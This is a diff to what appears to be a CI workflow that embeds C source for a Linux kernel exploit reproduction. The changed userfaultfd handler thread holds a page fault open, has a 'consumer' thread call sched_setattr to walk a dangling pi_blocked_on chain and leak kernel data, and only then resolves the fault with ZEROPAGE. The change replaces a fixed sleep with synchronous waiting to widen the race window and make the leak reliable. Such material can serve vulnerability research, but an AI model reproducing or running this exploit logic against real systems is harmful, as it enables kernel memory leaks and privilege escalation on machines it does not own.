@@ -359,7 +359,9 @@ jobs:
           }
 
           /* uffd 处理线程：收到缺页事件 → 若 dance 模式则 fire consumer →
-           * 等 3s（窗口内 fake waiter 在活栈上）→ ZEROPAGE 解决缺页 → sigreturn #2 继续 */
+           * 等 consumer 完成 sched_setattr（链行走泄漏）→ 再 ZEROPAGE 解决缺页。
+           * 关键：泄漏必须发生在 zeropage 之前，否则 sigreturn#2 已恢复并 UNLOCK，
+           *       悬空 pi_blocked_on 窗口关闭 → 无 leak */
           static void *uffd_thread(void *a) {
             int fd = ((struct uffd_arg *)a)->fd;
             unsigned char msg[32];
@@ -368,8 +370,15 @@ jobs:
                    n, msg[0], *(unsigned long long *)(msg + 16));
             fflush(stdout);
             unsigned long fault_addr = *(unsigned long long *)(msg + 16);
-            if (!suppress_consumer) ghost_go = 1;
-            sleep(3);
+            if (!suppress_consumer) {
+              ghost_go = 1;
+              /* 同步等待：consumer 完成 sched_setattr 链行走（泄漏）后才 zeropage */
+              int w = 0;
+              while (!consumer_done && w < 100) { usleep(50000); w++; }
+              printf("REPRO uffd waited consumer_done=%d w=%d\n", consumer_done, w);
+              fflush(stdout);
+            }
+            sleep(1);  /* 再留点余量 */
             struct uffdio_zeropage_414 zp;
             memset(&zp, 0, sizeof(zp));
             zp.range.start = fault_addr & ~0xfffULL;
